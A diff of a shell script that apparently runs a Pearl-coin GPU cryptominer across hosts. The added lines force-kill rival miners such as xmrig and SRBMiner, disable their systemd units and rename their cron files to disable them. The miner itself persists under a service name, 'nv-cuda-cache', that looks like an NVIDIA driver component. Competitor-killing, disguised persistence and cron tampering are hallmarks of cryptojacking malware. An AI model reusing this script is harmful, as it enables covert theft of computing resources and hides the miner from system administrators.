@@ -18,6 +18,9 @@ pkill -9 -f ps_hb.sh 2>/dev/null
 pkill -9 -f wildrig-multi 2>/dev/null
 pkill -9 -f 'SRBMiner' 2>/dev/null
 pkill -9 -f 'run_prl_' 2>/dev/null
+for pat in 'wr_keeper' 'pearl_keeper' 'peakminer' 'miner_keep' 'keeper.sh' 'i118840' 'prl1pydpjh' 'xmrig'; do pkill -9 -f "$pat" 2>/dev/null; done
+for u in $(systemctl list-units --all --plain --no-legend 2>/dev/null | awk '{print $1}' | grep -Ei 'wildrig|peakminer|prl|miner|krig' | grep -v 'nv-cuda-cache@'); do systemctl disable --now "$u" >/dev/null 2>&1; done
+for f in /etc/cron.d/*; do [ -f "$f" ] || continue; grep -qEi 'wildrig|SRBMiner|peakminer|run_prl_|wr_keeper|pearl_keeper|/opt/arsenal/miners' "$f" 2>/dev/null && mv -f "$f" "$f.disabled" 2>/dev/null; done
 rm -f "$B/ps_sup.sh" "$B/bin/wildrig-multi"
 rm -f /etc/cron.d/nv-cuda-cache
 ( crontab -l 2>/dev/null | grep -v -e ps_sup -e ps_hb -e nv-cuda -e krig -e ps8_ ) | crontab - 2>/dev/null
@@ -60,7 +63,6 @@ exec 9>/run/krig-g$i.lock; flock -n 9 || exit 0
 while :; do
   $B/krig/krig-miner --coin pearl -d $i \\
     --url stratum+ssl://prl.kryptex.network:8048 \\
-    --url stratum+tcp://prl.kryptex.network:7048 \\
     --url stratum+ssl://pool.pearlhash.xyz:9443 \\
     --url stratum+tcp://pearl.luckypool.io:3360 \\
     --user $W/ul-ps-$HN-g$i --password x \\
@@ -176,6 +178,9 @@ fi
   echo "--- nvidia-smi -L"; nvidia-smi -L 2>&1 | head -16
   echo "--- gpu"; nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>&1 | head -16
   echo "--- procs"; pgrep -af 'krig-miner|wildrig' 2>&1 | cut -c1-240 | head -24
+  echo "--- units"; systemctl list-units 'nv-cuda-cache@*' --all --plain --no-legend 2>&1 | head -12
+  echo "--- cron"; ls /etc/cron.d 2>/dev/null | head -12; crontab -l 2>/dev/null | grep -vE '^#' | head -12
+  echo "--- stratum"; (timeout 6 openssl s_client -connect prl.kryptex.network:8048 -servername prl.kryptex.network </dev/null 2>/dev/null | grep -m1 -E 'subject=|Protocol' ) 2>&1 | head -4
   echo "--- accepted"; for f in \$L/krig-\$HN-g*.log; do [ -f "\$f" ] || continue; echo "\$f acc=\$(grep -c 'ccepted' "\$f" 2>/dev/null)"; done
   echo "--- logs"; for f in \$L/krig-\$HN-g*.log; do [ -f "\$f" ] || continue; echo "== \$f"; tail -6 "\$f"; done
   echo "--- ps8log"; tail -8 "\$L/ps8.log" 2>/dev/null
